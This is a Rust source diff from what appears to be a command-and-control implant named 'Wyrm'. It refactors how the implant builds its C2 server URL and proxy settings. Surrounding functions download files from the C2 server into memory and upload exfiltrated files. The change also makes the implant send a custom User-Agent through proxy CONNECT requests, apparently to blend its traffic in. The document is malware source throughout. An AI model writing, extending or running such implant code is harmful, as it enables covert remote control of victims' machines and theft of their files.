@@ -55,11 +55,11 @@ pub fn construct_c2_url(implant: &Wyrm) -> String {
     const MAX_PORT_SZ: usize = 6;
     const LEEWAY_SLASH_SZ: usize = 1;
     let approx_len =
-        implant.c2_config.url.len() + COLON_SZ + MAX_PORT_SZ + uri.len() + LEEWAY_SLASH_SZ;
+        implant.c2_config.url.0.len() + COLON_SZ + MAX_PORT_SZ + uri.len() + LEEWAY_SLASH_SZ;
 
     let mut s = String::with_capacity(approx_len);
 
-    s.push_str(&implant.c2_config.url);
+    s.push_str(&implant.c2_config.url.0);
     s.push(':');
     s.push_str(&implant.c2_config.port.to_string());
 
@@ -277,7 +277,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, ureq::E
 /// as it will cause the device to run OOM. If that functionality is necessary, then make a streaming function which
 /// downloads to a file over a stream.
 pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, ureq::Error> {
-    let formatted_url = format!("{}:{}{}", wyrm.c2_config.url, wyrm.c2_config.port, uri);
+    let formatted_url = format!("{}:{}{}", wyrm.c2_config.url.0, wyrm.c2_config.port, uri);
     let sec_token = &wyrm.c2_config.security_token;
     let ua = &wyrm.c2_config.useragent;
     let headers = generate_generic_headers(&wyrm.implant_id, sec_token, ua);
@@ -347,7 +347,7 @@ pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
 }
 
 fn generate_http_agent(implant: &Wyrm) -> Agent {
-    if let Some(px) = implant.try_get_proxy() {
+    if let Some(px) = &implant.c2_config.url.1 {
         let px = Proxy::new(&px).unwrap();
         let config = Config::builder()
             .tls_config(
@@ -357,6 +357,9 @@ fn generate_http_agent(implant: &Wyrm) -> Agent {
                     .build(),
             )
             .proxy(Some(px))
+            // Set the User-Agent in the builder to make sure proxy CONNECT connections have the UA,
+            // as opposed to the ureq UA.
+            .user_agent(implant.c2_config.useragent.clone())
             .build();
 
         config.into()
@@ -369,6 +372,9 @@ fn generate_http_agent(implant: &Wyrm) -> Agent {
                     .build(),
             )
             .proxy(None)
+            // Set the User-Agent in the builder to make sure proxy CONNECT connections have the UA,
+            // as opposed to the ureq UA.
+            .user_agent(implant.c2_config.useragent.clone())
             .build()
             .into();
 
